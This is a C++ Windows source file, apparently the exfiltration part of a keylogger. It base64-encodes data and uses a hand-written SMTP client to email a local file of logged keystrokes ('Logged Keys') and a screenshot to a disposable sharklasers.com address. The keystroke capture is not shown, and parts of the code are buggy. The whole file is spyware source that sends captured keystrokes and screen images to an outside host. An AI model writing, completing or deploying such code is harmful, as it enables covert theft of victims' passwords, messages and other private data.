#define _WIN32_WINNT 0x501
#include<bits/stdc++.h>
#include<windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <winsock2.h>

using namespace std;

#define SMTP_PORT "25"
#define DEFAULT_BUFLEN 512
#define EMAIL_TIME 7200
#define SSTIME 900
#define recipientAddr "mdsiam01@sharklasers.com"
#define SMTPLog "smtp.log"


#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

static char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                '4', '5', '6', '7', '8', '9', '+', '/'};
static char *decoding_table = NULL;
static int mod_table[] = {0, 2, 1};

void build_decoding_table() {

    decoding_table = (char*)malloc(256);

    for (int i = 0; i < 64; i++)
        decoding_table[(unsigned char) encoding_table[i]] = i;
}


void base64_cleanup() {
    free(decoding_table);
}

char *base64_encode(const unsigned char *data,
                    size_t input_length,
                    size_t *output_length) {

    *output_length = 4 * ((input_length + 2) / 3);

    char *encoded_data = (char*)malloc(*output_length);
    if (encoded_data == NULL) return NULL;

    for (int i = 0, j = 0; i < input_length;) {

        uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
    }

    for (int i = 0; i < mod_table[input_length % 3]; i++)
        encoded_data[*output_length - 1 - i] = '=';

    return encoded_data;
}


unsigned char *base64_decode(const char *data,
                             size_t input_length,
                             size_t *output_length) {

    if (decoding_table == NULL) build_decoding_table();

    if (input_length % 4 != 0) return NULL;

    *output_length = input_length / 4 * 3;
    if (data[input_length - 1] == '=') (*output_length)--;
    if (data[input_length - 2] == '=') (*output_length)--;
    unsigned char *decoded_data = (unsigned char*)malloc(*output_length);
    if (decoded_data == NULL) return NULL;

    for (int i = 0, j = 0; i < input_length;) {

        uint32_t sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];

        uint32_t triple = (sextet_a << 3 * 6)
        + (sextet_b << 2 * 6)
        + (sextet_c << 1 * 6)
        + (sextet_d << 0 * 6);

        if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
    }

    return decoded_data;
}

int sendData(SOCKET* socket, const char* data)
{
    int iResult;
    printf("%s", data);
    iResult = send(*socket, data, (int)strlen(data), 0);
    if (iResult == SOCKET_ERROR) {
        printf("send failed (msg: %s): %d\n", data, WSAGetLastError());
    }
    return iResult;
}

void recvData(SOCKET* socket)
{
    int recvbuflen = DEFAULT_BUFLEN;
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    iResult = recv(*socket, recvbuf, recvbuflen - 1, 0);
    printf("In recvData function: %d\n", iResult);
    if (iResult > 0) {
        recvbuf[iResult] = '\0';
        printf("%s", recvbuf);
    }
    else if (iResult == 0)
        printf("Connection closed\n");
    else
        printf("recv failed: %d\n", WSAGetLastError());
}

int mailMyLog(char *receiverAddress) {


    WSADATA wsaData;

    int iResult;
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed: %d\n", iResult);
        return 1;
    }

    struct addrinfo *result = NULL;
    struct addrinfo *ptr = NULL;
    struct addrinfo hints;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo("mail.sharklasers.com", SMTP_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    SOCKET ConnectSocket = INVALID_SOCKET;
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("socket failed: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        cout<<ConnectSocket<< " "<< ptr->ai_addr << " "<< (int)ptr->ai_addrlen<<endl;
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        cout<< iResult<<endl;
        cout<< WSAGetLastError()<<endl;
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            printf("error detected\n");
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }
    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        printf(" %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    sendData(&ConnectSocket, "HELO mail.sharklasers.com\r\n");
    recvData(&ConnectSocket);
    Sleep(1000);
    sendData(&ConnectSocket, "MAIL FROM:<siamloggingyourkey@sharklasers.com>\r\n");
    recvData(&ConnectSocket);
    char line[1000];
    strcpy(line,"RCPT TO:<");
    strncat(line,receiverAddress,strlen(receiverAddress));
    strncat(line,">\r\n",3);
    sendData(&ConnectSocket, line);
    recvData(&ConnectSocket);
    sendData(&ConnectSocket, "DATA\n");
    recvData(&ConnectSocket);
    sendData(&ConnectSocket, "Subject:Logged Keys\r\n");
    sendData(&ConnectSocket, "And this is text\r\n");
    sendData(&ConnectSocket, "MIME-Version: 1.0\r\n");
    sendData(&ConnectSocket, "Content-Type:multipart/mixed;boundary=\"977d81ff9d852ab2a0cad646f8058349\"\r\n");
    sendData(&ConnectSocket, "Subject:Logged Keys\r\n");
    sendData(&ConnectSocket, "\r\n"); /* added */
    sendData(&ConnectSocket, "--977d81ff9d852ab2a0cad646f8058349\r\n");
    sendData(&ConnectSocket, "Content-Type: text/plain; charset=\"utf-8\"\r\n");
    sendData(&ConnectSocket, "Content-Transfer-Encoding: quoted-printable\r\n\r\n");
    FILE *fp = fopen("log.txt", "r");
    char mylogs[10000];
    char tem[100];
    strcat(mylogs, "Hi Admin,=0A=0AHere is the logged key.=0A=0A");
    sendData(&ConnectSocket, mylogs);
    while(fgets(tem,100,fp)!=NULL)
    {
        int size1= strlen(tem);
        tem[size1-1]='\n';
        tem[size1]='\0';
        sendData(&ConnectSocket, tem);
        //tem[size1-1]='\n';

        //std::cout<< tem <<std::endl;
        strcat(mylogs, tem);
    }
    sendData(&ConnectSocket,"=0A=0ARegards,=0A<SIAM>=0A=0A\r\n\r\n");
    sendData(&ConnectSocket, "--977d81ff9d852ab2a0cad646f8058349\r\n");
    sendData(&ConnectSocket, "Content-Type: image/png\r\n");
    char tosend[100] = "Content-Length: ";

    FILE *File = fopen("Screenshot_2.png", "r");
    fseek(File, 0, SEEK_END);
    unsigned long Size = ftell(File);
    fseek(File, 0, SEEK_SET);

    char *Buffer = new char[Size];

    fread(Buffer, Size, 1, File);
    char cSize[MAX_PATH];
    sprintf(cSize, "%lu", Size);
    printf("%lu\n", Size);
    fclose(File);
    printf("%s\n", Buffer);


    sprintf(tosend, "Content-Length: %lu\r\n", Size);

    sendData(&ConnectSocket, tosend);
    sendData(&ConnectSocket, "Content-Disposition: attachment; filename=\"Screenshot_2.png\"\r\n\r\n");
    //sendData(&ConnectSocket, "U2FtcGxlIFRleHQu");
    sendData(&ConnectSocket, ".\r\n");


    if (!File)
    {
        printf("Error opening the file\n");
        getchar();
        return 0;
    }




    /*int iRes = send(ConnectSocket, cSize, MAX_PATH, 0); // File size
    if (iRes == SOCKET_ERROR) {
        printf("send failed (msg: %s): %d\n", cSize, WSAGetLastError());
    }
    cout<< 1 <<endl;*/
    /*int iRes = send(ConnectSocket, Buffer, Size, 0);
    if (iRes == SOCKET_ERROR) {
        printf("send failed (msg: %s): %d\n", Buffer, WSAGetLastError());
    }*/
    //cout<< 21<<endl;
    send(ConnectSocket, Buffer, Size, 0);
 /*   int Offset = 0;
    while(Size > Offset)
    {
        int Amount = send(ConnectSocket, Buffer + Offset, Size - Offset, 0);

        if(Amount <= 0)
        {

            break;
        }
        else
        {
            Offset += Amount;
            printf("2\n");
        }
    }
*/
    delete [] Buffer;

    Sleep(2000);
    sendData(&ConnectSocket, "977d81ff9d852ab2a0cad646f8058349--\r\n");
    sendData(&ConnectSocket, "\r\n\r\n--977d81ff9d852ab2a0cad646f8058349--\r\n\r\n");
    //sendData(&ConnectSocket, buf);
    //sendData(&ConnectSocket, "\r\n\r\n--KkK170891tpbkKk__FV_KKKkkkjjwq--\r\n\r\n");
    sendData(&ConnectSocket, ".\r\n");
    recvData(&ConnectSocket);

    sendData(&ConnectSocket, "QUIT\r\n");

    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    closesocket(ConnectSocket);
    WSACleanup();
    return 0;
}

int main()
{
    mailMyLog(recipientAddr);
}

